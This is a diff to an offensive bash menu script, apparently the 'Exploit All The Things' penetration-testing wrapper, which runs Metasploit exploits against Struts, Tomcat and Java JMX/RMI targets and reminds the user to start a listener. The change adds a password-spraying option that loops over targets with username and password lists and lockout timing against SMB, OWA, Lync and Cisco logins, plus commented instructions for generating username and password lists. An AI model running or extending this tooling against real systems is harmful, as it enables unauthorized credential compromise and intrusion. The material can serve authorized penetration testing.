@@ -674,8 +674,8 @@ done
  echo -e "\E[1;34m::::: \e[97mExploit All The Things!! \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
-options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
+options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -806,7 +806,61 @@ do
 	done
             echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
             echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
-            ;;            
+            ;; 
+        "Password Spray")
+    echo -e "\E[1;34m::::: \e[97mSpiderLabs' Password Spray Attack \E[1;34m:::::"    
+cat << "EOF"
+<PLATFORM Choices>:
+   + smb
+   + owa
+   + lync 
+   + cisco
+Do not enter the + sign when you type in "owa", "smb", or whichever you choose.
+Leave DOMAIN Option Blank Unless Using SMB 
+Leave RequestsFile Option Blank Unless Using OWA 
+
++ OWA
+To password spray an OWA portal, a file must be created of the POST request with the Username: sprayuser@domain.com, and Password: spraypassword
+Capture this with Burpsuite or ZAP
+
++ Lync
+To password spray a lync service, a lync autodiscover url or a url that returns the www-authenticate header must be entered into the MSF_targets.txt file. Your Username list must also contain valid email addresses.
+Example: https://lyncdiscover.spiderlabs.com/
+Example: https://lyncweb.spiderlabs.com/Autodiscover/AutodiscoverService.svc/root/oauth/user
+
+You may use IPs and/or URLs in the MSF_targets.txt file to accommodate your target type. 
+EOF
+            read -p 'Set PLATFORM: ' userplatform; read -p 'Set PLATFORM: ' userplatform; read -p 'Set Username List: ' usernames; read -p 'Set Password List: ' userpasswords; read -p 'Set Attempts Per Lockout (Example: 1): ' userattempts; read -p 'Set Lockout Period In Minutes (Example: 35): ' userlockout; read -p 'Set DOMAIN (SMB Mode Only): ' userdomain; read -p 'Set RequestsFile (OWA Mode Only): ' userrequestsfile;
+	inputfile=~/ATAT/MSF_targets.txt
+	outputfile=~/ATAT/Spray_output.txt
+	for IP in $(cat $inputfile)
+	do
+	~/Spray/spray.sh -$userplatform $IP $usernames $userpasswords $userattempts $userlockout $userdomain $userrequestsfile | tee -a $outputfile
+	done
+		echo -e "\E[1;34m::::: \e[97mAll Output Has Been Saved In Spray_output.txt \E[1;34m:::::"
+        echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
+			;;
+#		"Password List Update")
+
+#Usage: spray.sh -passupdate <passwordList>
+#Example: spray.sh -passupdate passwords.txt
+
+#An optional company name can also be provided to add to the list
+
+
+#Useage: spray.sh -passupdate <passwordList> <CompanyName>
+#Example: spray.sh -passupdate passwords.txt Spiderlabs
+
+#			;;
+#	"Username Generation")
+
+#A username list can also be generated from a list of common names
+
+
+#Usage: spray.sh -genusers <firstnames> <lastnames> "<<fi><li><fn><ln>>"
+#Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fi><ln>"
+#Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fn>.<ln>"  
+#			;;       
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
